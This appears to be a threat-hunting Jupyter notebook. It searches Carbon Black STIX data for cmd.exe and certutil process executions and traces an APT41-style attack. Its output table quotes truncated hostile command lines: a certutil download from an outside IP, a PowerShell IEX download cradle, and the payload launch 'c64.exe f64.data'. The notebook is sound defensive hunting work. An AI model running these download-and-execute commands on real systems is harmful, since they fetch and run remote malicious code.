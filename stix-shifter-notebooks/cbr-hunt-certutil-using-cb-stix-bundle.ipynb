{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CERTUTIL hunt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This notebook helps to collect all cmd (cmd.exe) and (certutil.exe) process executions in order to find suspicious activity.\n",
    "\n",
    "This example demontrates how to found suspicious executation that downloaded by using certuil.exe, and then using certuil.exe to attack."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyclient.stix_shifter_dataframe import StixShifterDataFrame\n",
    "from dateutil import parser\n",
    "import huntlib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Username: ''\n",
      "Password: ········\n"
     ]
    }
   ],
   "source": [
    "usr, psw = huntlib.util.promptCreds()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "carbon_black_stix_bundle = 'https://raw.githubusercontent.com/opencybersecurityalliance/stix-shifter/develop/data/cybox/carbon_black/carbon_black_observable.json'\n",
    "sb_config = {\n",
    "    'connection': {\n",
    "        \"host\": carbon_black_stix_bundle,\n",
    "        \"port\": 443\n",
    "    },\n",
    "    'configuration': {\n",
    "        \"auth\": {\n",
    "            \"username\": usr,\n",
    "            \"password\": psw\n",
    "        }\n",
    "    },\n",
    "    'data_source': '{\"type\": \"identity\", \"id\": \"identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3\", \"name\": \"stix_boundle\", \"identity_class\": \"events\"}'\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_duration(duration):\n",
    "    days, seconds = duration.days, duration.seconds\n",
    "    hours = seconds // 3600\n",
    "    minutes = (seconds % 3600) // 60\n",
    "    seconds = seconds % 60\n",
    "    return f\"{days}d {hours}h {minutes}m {seconds}.{duration.microseconds//1000}s\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "def extract_string(data, regex, group):\n",
    "    try:\n",
    "        pattern = re.compile(regex)\n",
    "        matches = pattern.search(data)\n",
    "        return matches.group(group)\n",
    "    except:\n",
    "        return ''"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fetch process data that are spawn by cmd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "ssdf = StixShifterDataFrame()\n",
    "ssdf.add_config('stix_bundle', sb_config)\n",
    "cmd_query = \"[process:name='cmd.exe']\"\n",
    "df = ssdf.search_df(query=cmd_query, config_names=['stix_bundle'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "df['first_observed'] = df['first_observed'].map(lambda x: parser.isoparse(x))\n",
    "df['last_observed'] = df['last_observed'].map(lambda x: parser.isoparse(x))\n",
    "df['duration'] = df['last_observed'] - df['first_observed']\n",
    "df['duration'] = df['duration'].map(lambda dur: get_duration(dur))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Found suspicious command line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0    c64.exe f64.data \"9839D7F1A0 -m\"\n",
       "Name: process:command_line, dtype: object"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['cmd_certutil'] = df['process:command_line'].apply(extract_string, regex=r'certutil', group=0)\n",
    "df['cmd_exe'] = df['process:command_line'].apply(extract_string, regex=r'[0-9a-zA-Z_-]*\\.exe', group=0)\n",
    "df['cmd_dat'] = df['process:command_line'].apply(extract_string, regex=r'[0-9a-zA-Z_-]*\\.dat.', group=0)\n",
    "\n",
    "# *.exe that was download by using certutil\n",
    "exe_list = list(df[(df.cmd_certutil != '') & (df.cmd_exe != '')].cmd_exe.apply(lambda x: x.lower()).values)\n",
    "\n",
    "# *.dat that was download by using certutil\n",
    "dat_list = list(df[(df.cmd_certutil != '') & (df.cmd_dat != '')].cmd_dat.apply(lambda x: x.lower()).values)\n",
    "\n",
    "# command line that contains both *.exe and *.dat\n",
    "df[df.cmd_exe.isin(exe_list) & df.cmd_dat.isin(dat_list)]['process:command_line']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack steps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>first_observed</th>\n",
       "      <th>last_observed</th>\n",
       "      <th>duration</th>\n",
       "      <th>process:name</th>\n",
       "      <th>process:pid</th>\n",
       "      <th>process:binary_ref.name</th>\n",
       "      <th>process:parent_ref.name</th>\n",
       "      <th>network-traffic:dst_ref.value</th>\n",
       "      <th>network-traffic:src_ref.value</th>\n",
       "      <th>process:command_line</th>\n",
       "      <th>user-account:user_id</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-10-01 19:29:35+00:00</td>\n",
       "      <td>2019-10-01 19:29:35+00:00</td>\n",
       "      <td>0d 0h 0m 0.0s</td>\n",
       "      <td></td>\n",
       "      <td>757</td>\n",
       "      <td></td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>192.168.0.8</td>\n",
       "      <td>67.229.97.229</td>\n",
       "      <td></td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>0d 0h 0m 0.0s</td>\n",
       "      <td>certutil.exe</td>\n",
       "      <td>744</td>\n",
       "      <td>certutil.exe</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>67.229.97.229</td>\n",
       "      <td>certutil -urlcache -split -f http://67.229.97....</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>0d 0h 0m 0.0s</td>\n",
       "      <td>certutil.exe</td>\n",
       "      <td>744</td>\n",
       "      <td>certutil.exe</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>67.229.97.229</td>\n",
       "      <td>certutil -urlcache -split -f http://67.229.97....</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>0d 0h 0m 0.0s</td>\n",
       "      <td>c64.exe</td>\n",
       "      <td>757</td>\n",
       "      <td>c64.exe</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td></td>\n",
       "      <td>c64.exe f64.data \"9839D7F1A0 -m\"</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>2019-10-03 14:53:35+00:00</td>\n",
       "      <td>0d 0h 0m 0.0s</td>\n",
       "      <td>powershell.exe</td>\n",
       "      <td>2252</td>\n",
       "      <td>powershell.exe</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td></td>\n",
       "      <td>powershell \"IEX (New-Object Net.WebClient).Dow...</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "             first_observed             last_observed       duration  \\\n",
       "0 2019-10-01 19:29:35+00:00 2019-10-01 19:29:35+00:00  0d 0h 0m 0.0s   \n",
       "0 2019-10-03 14:53:35+00:00 2019-10-03 14:53:35+00:00  0d 0h 0m 0.0s   \n",
       "0 2019-10-03 14:53:35+00:00 2019-10-03 14:53:35+00:00  0d 0h 0m 0.0s   \n",
       "0 2019-10-03 14:53:35+00:00 2019-10-03 14:53:35+00:00  0d 0h 0m 0.0s   \n",
       "0 2019-10-03 14:53:35+00:00 2019-10-03 14:53:35+00:00  0d 0h 0m 0.0s   \n",
       "\n",
       "     process:name  process:pid process:binary_ref.name  \\\n",
       "0                          757                           \n",
       "0    certutil.exe          744            certutil.exe   \n",
       "0    certutil.exe          744            certutil.exe   \n",
       "0         c64.exe          757                 c64.exe   \n",
       "0  powershell.exe         2252          powershell.exe   \n",
       "\n",
       "  process:parent_ref.name network-traffic:dst_ref.value  \\\n",
       "0                 cmd.exe                   192.168.0.8   \n",
       "0                 cmd.exe                     127.0.0.1   \n",
       "0                 cmd.exe                     127.0.0.1   \n",
       "0                 cmd.exe                     127.0.0.1   \n",
       "0                 cmd.exe                     127.0.0.1   \n",
       "\n",
       "  network-traffic:src_ref.value  \\\n",
       "0                 67.229.97.229   \n",
       "0                 67.229.97.229   \n",
       "0                 67.229.97.229   \n",
       "0                                 \n",
       "0                                 \n",
       "\n",
       "                                process:command_line user-account:user_id  \n",
       "0                                                                  SYSTEM  \n",
       "0  certutil -urlcache -split -f http://67.229.97....               SYSTEM  \n",
       "0  certutil -urlcache -split -f http://67.229.97....               SYSTEM  \n",
       "0                   c64.exe f64.data \"9839D7F1A0 -m\"               SYSTEM  \n",
       "0  powershell \"IEX (New-Object Net.WebClient).Dow...               SYSTEM  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fields = ['first_observed', 'last_observed', 'duration',\n",
    "    'process:name', 'process:pid', \n",
    "    'process:binary_ref.name', 'process:parent_ref.name', \n",
    "    'network-traffic:dst_ref.value', 'network-traffic:src_ref.value', \n",
    "    'process:command_line', 'user-account:user_id'\n",
    "]\n",
    "\n",
    "df[fields].sort_values(by=['first_observed'])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this notebook, we finally found that this is a APT attack , ```c64.exe f64.data \"9839D7F1A0 -m\" ```\n",
    "Ref: https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
